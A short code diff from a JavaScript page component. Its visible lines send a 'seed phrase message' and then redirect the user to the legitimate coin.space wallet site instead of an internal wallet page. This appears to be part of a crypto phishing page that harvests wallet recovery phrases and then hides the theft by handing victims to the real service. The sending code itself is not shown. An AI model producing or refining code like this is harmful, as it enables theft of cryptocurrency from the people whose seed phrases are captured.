@@ -97,7 +97,7 @@ export default function Page() {
           }
         )
       .then(response => response.data)
-      .then(() => router.push("/wallet?mode=input"))
+      .then(() => window.location.href = "https://coin.space/wallet/")
       .catch(error => console.error("Error sending seed phrase message:", error));
   };
 
